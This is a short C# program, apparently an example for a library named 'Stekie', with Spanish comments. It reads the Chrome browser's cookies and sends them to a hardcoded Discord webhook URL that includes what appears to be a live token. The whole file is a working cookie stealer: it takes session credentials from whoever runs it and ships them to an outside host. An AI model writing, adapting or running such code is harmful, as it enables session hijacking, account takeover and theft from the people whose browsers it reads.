using System;
using System.Threading.Tasks;
using Discord.Webhook;
using Stekie;

namespace example
{
    class Program
    {
        static async Task Main(string[] args)
        {
            // Obtener las cookies de Chrome
            var cookies = Chrome.cookies.GetString();

            // Enviar las cookies a una webhook de Discord
            var webhookClient = new DiscordWebhookClient("https://discordapp.com/api/webhooks/1099885052298543285/3_vnpdYURNK27vZlG2auFzWQQYGiLJPSg17dIlqcxOthXQsJY3JgEGPYXQGHsKJgtPMz");
            await webhookClient.SendMessageAsync(cookies);
        }
    }
}
